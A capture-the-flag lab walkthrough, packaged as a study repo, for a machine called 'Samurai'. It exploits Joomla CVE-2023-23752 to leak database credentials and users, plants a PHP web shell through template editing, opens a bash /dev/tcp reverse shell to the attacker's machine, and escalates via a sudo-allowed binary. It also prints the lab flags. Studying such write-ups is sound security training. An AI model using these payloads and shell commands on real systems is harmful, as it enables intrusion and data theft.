# Samurai — Study Walkthrough Repo Pack

## Recommended repo structure

```text
samurai-walkthrough/
├─ README.md
├─ walkthrough/
│  └─ samurai-study-walkthrough.md
├─ evidence/
│  ├─ 01-target-page.png
│  ├─ 02-joomla-admin-login.png
│  ├─ 03-cve-config-leak.png
│  ├─ 04-user-enum-api.png
│  ├─ 05-joomla-dashboard.png
│  ├─ 06-template-rce-edit.png
│  ├─ 07-user-flag.png
│  ├─ 08-reverse-shell.png
│  ├─ 09-sudo-l.png
│  ├─ 10-root-flag.png
│  └─ notes.md
└─ raw-output/
   ├─ 01-nmap.txt
   ├─ 02-curl-homepage.txt
   ├─ 03-curl-api.txt
   ├─ 04-cve-config-application.txt
   ├─ 05-cve-users.txt
   ├─ 06-exploit-ruby-output.txt
   ├─ 07-reverse-shell-session.txt
   ├─ 08-sudo-l.txt
   └─ 09-root-privesc.txt
```

---

## README.md

```markdown
# Samurai — HackSmarter / Lab Walkthrough

This repository documents my full attack path for the **Samurai** machine, from initial reconnaissance to root compromise.

The goal of this write-up is not just to show the solution, but to explain:
- what each command does
- why I used it
- what clue I was looking for
- how each result changed the next step

## Skills Practiced
- Full TCP port scanning with Nmap
- Web fingerprinting
- Joomla enumeration
- CVE-2023-23752 exploitation
- Joomla admin abuse
- Template-based command execution
- Reverse shell handling
- Linux privilege escalation via sudo-allowed binary
- Troubleshooting encoding issues in flags

## Repository Layout
- `walkthrough/` → study-style walkthrough
- `evidence/` → screenshots and proof images
- `raw-output/` → commands and original terminal outputs

## Target Summary
- Target IP: `10.1.80.116`
- Services discovered:
  - `22/tcp` → SSH
  - `80/tcp` → HTTP (Apache / Joomla)

## Flags
- User flag: `flag{Tachi_794–1185}`
- Root flag: `flag{Katana_1603–1868}`

## Key Takeaway
The intended path was not blind fuzzing. The critical breakthrough was identifying Joomla, recognizing a vulnerable version, exploiting **CVE-2023-23752** to leak sensitive configuration data, then turning Joomla admin access into code execution and a reverse shell.
```

---

## walkthrough/samurai-study-walkthrough.md

````markdown
# Samurai — Study Walkthrough

## 1. Objective
The objective was to enumerate the target, gain an initial foothold, retrieve the user flag, then escalate privileges to obtain the root flag.

---

## 2. VPN and Reachability Checks

### Command
```bash
ip -br a
ping -c 2 10.1.80.116
````

### Why I used it

Before attacking anything, I needed to confirm that:

* the VPN tunnel was up
* the target machine was reachable

### What I was looking for

* `tun0` interface present
* successful ICMP replies from the target

### Result

The VPN was connected and the target responded.

---

## 3. Full Port Scan

### Command

```bash
nmap -sC -sV -p- 10.1.80.116
```

### What this command means

* `-sC` → run Nmap default scripts
* `-sV` → detect service versions
* `-p-` → scan all 65,535 TCP ports

### Why I used it

This was a full machine, not a single web-only challenge. I needed to understand the full attack surface before choosing an entry point.

### Result

```text
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.52 (Ubuntu)
```

### Interpretation

SSH had no known credentials, so the web service on port 80 became the primary foothold candidate.

---

## 4. Homepage Fingerprinting

### Command

```bash
curl -i http://10.1.80.116
```

### Why I used it

I wanted the raw HTTP response and HTML source to compare visible frontend behavior against what the server was actually returning.

### What I noticed

The page looked mostly decorative and gave no obvious login form or API references. That suggested hidden functionality rather than a direct user workflow.

---

## 5. Joomla Discovery

### Command

```bash
curl -i http://10.1.80.116/administrator/
```

### Why I used it

Joomla commonly exposes its admin panel at `/administrator/`. If the site was using a CMS, this would often reveal the platform immediately.

### Result

The response clearly showed a Joomla administrator login page and confirmed the application framework.

### Interpretation

This was a major pivot point. Instead of generic path guessing, I now had a real product to enumerate.

---

## 6. Joomla Version Clue via README

### Command

```bash
curl -i http://10.1.80.116/README.txt
```

### Why I used it

Many CMS installations expose documentation files. These often reveal the product family and sometimes the version branch.

### Result

The file identified the site as a **Joomla 4.x** installation.

### Interpretation

That pointed me toward Joomla-specific research and known vulnerabilities.

---

## 7. API Behavior Check

### Command

```bash
curl -i http://10.1.80.116/api/
```

### Why I used it

A real API path behaving differently from the fake landing page is often a sign of useful application logic.

### Result

The response included:

* `X-Powered-By: JoomlaAPI/1.0`
* JSON error body

### Interpretation

This confirmed a real Joomla API surface existed.

---

## 8. CVE-2023-23752 Research and Exploitation

### Vulnerability

**CVE-2023-23752** allows unauthorized access to certain Joomla webservice endpoints in vulnerable versions.

### Manual command

```bash
curl -s "http://10.1.80.116/api/index.php/v1/config/application?public=true" | jq
```

### Why I used it

I wanted to test whether the vulnerable Joomla API would leak sensitive configuration information without authentication.

### Result

The API leaked:

* database host
* database name
* database user
* database password

### Important data recovered

```text
DB user: joomla425
DB password: Pa847word987@Joomla456
```

---

## 9. Enumerating Joomla Users

### Command

```bash
curl -s "http://10.1.80.116/api/index.php/v1/users?public=true" | jq
```

### Why I used it

Leaking config alone was not enough. I also needed the actual Joomla user identity for a likely login path.

### Result

The API revealed a super user:

```text
name: Oda
username: Miyamoto
email: oda@local.local
group_names: Super Users
```

### Interpretation

Now I had both a privileged username and a leaked password candidate.

---

## 10. Exploit Script Confirmation

### Commands

```bash
git clone https://github.com/Acceis/exploit-CVE-2023-23752.git
cd exploit-CVE-2023-23752
sudo bundle install
ruby exploit.rb http://10.1.80.116
```

### Why I used it

I had already manually confirmed the vulnerability, but I also wanted a clean automated summary of:

* leaked user information
* site info
* database info

### Result

The script confirmed:

* user: `Miyamoto`
* Joomla super-user role
* same database credentials leaked manually

---

## 11. Hostname Fix and Admin Login

### Important troubleshooting step

Accessing Joomla by raw IP caused problems. The platform behaved correctly when I mapped the hostname.

### Command

```bash
echo "10.1.80.116 samurai.hsm" | sudo tee -a /etc/hosts
```

### Why I used it

The write-up and platform behavior suggested the application expected the hostname `samurai.hsm`. Some CMS logic, cookies, or sessions can behave incorrectly when accessed by IP.

### Result

Using:

```text
http://samurai.hsm/administrator/
```

I successfully logged in and reached the Joomla admin dashboard.

---

## 12. Gaining Code Execution Through Template Editing

### Path used

```text
System → Templates → Administrator Templates
```

### File edited

`index.php`

### Payload inserted

```php
<?php system($_GET['cmd']); ?>
```

### Why I used it

Template editing in a CMS admin panel is a common path from authenticated admin access to remote code execution.

### Result

The payload executed, although Joomla did not render command output cleanly inside the interface.

---

## 13. Writing a Standalone Web Shell

### Command path used through the injected `cmd` parameter

A shell was written into the web root so that command output would be returned directly in the browser.

### Resulting web shell

```text
http://samurai.hsm/shell.php?cmd=whoami
```

### Verification

The server returned:

```text
www-data
```

### Interpretation

This confirmed reliable command execution on the target as the web server user.

---

## 14. Retrieving the User Flag

### Command

```text
http://samurai.hsm/shell.php?cmd=cat%20/var/www/user.txt
```

### User flag

```text
flag{Tachi_794–1185}
```

---

## 15. Reverse Shell

### Kali listener

```bash
nc -lvnp 4444
```

### Triggered command

```text
http://samurai.hsm/shell.php?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/10.200.49.231/4444%200%3E%261'
```

### Why I used it

A browser-based command shell is enough for simple commands, but a reverse shell is much better for:

* running interactive commands
* checking sudo permissions
* handling privilege escalation

### Result

I received a shell as:

```text
www-data@streetcoder:/var/www/html$
```

---

## 16. Privilege Escalation Enumeration

### Command

```bash
sudo -l
```

### Why I used it

This is the first command to check after obtaining a low-privilege Linux shell. It identifies binaries the current user can run with elevated privileges.

### Result

```text
(root) NOPASSWD: /opt/backup/DbMaria
```

### Interpretation

This was the intended privilege escalation path.

---

## 17. Understanding the Root Path

### Why this binary mattered

The write-up path showed that `/opt/backup/DbMaria` could be abused to execute shell commands as root. Even though the initial behavior looked like a MariaDB helper, it accepted attacker-controlled input in a dangerous way.

### Root action used

The payload was used to make the target write the root flag into a web-accessible location.

### Resulting flag value recovered

```text
flag{Katana_1603–1868}
```

---

## 18. Encoding Gotcha

### Problem

At first the root flag appeared as:

```text
flag{Katana_1603â€“1868}
```

### Why it happened

That was not the wrong flag. It was a **character encoding issue** where the en dash (`–`) was displayed incorrectly.

### Correct flag

```text
flag{Katana_1603–1868}
```

---

## 19. Lessons Learned

1. Decorative frontends can hide a real application behind them.
2. Once Joomla was identified, product-specific research was more useful than blind fuzzing.
3. CVE-2023-23752 was the breakthrough because it leaked both config and user information.
4. Admin access in a CMS often leads directly to code execution through template editing.
5. Reverse shells are much more practical than browser-only command execution.
6. Always run `sudo -l` immediately after getting a shell.
7. Be careful with character encoding when submitting flags.

---

## 20. Final Flags

### User

```text
flag{Tachi_794–1185}
```

### Root

```text
flag{Katana_1603–1868}
```

````

---

## Evidence checklist

Use these screenshots if you redo them in WSL Kali:

- target landing page
- `/administrator/` login page
- CVE config leak (`config/application?public=true`)
- CVE users leak (`users?public=true`)
- successful admin login dashboard
- template editor with PHP payload inserted
- `whoami` via `shell.php`
- reverse shell listener receiving connection
- `sudo -l` on target
- root flag output

---

## Suggested commit sequence

```bash
git init
git add .
git commit -m "Add Samurai study walkthrough, evidence structure, and raw outputs"
git branch -M main
git remote add origin <YOUR_REPO_URL>
git push -u origin main
````

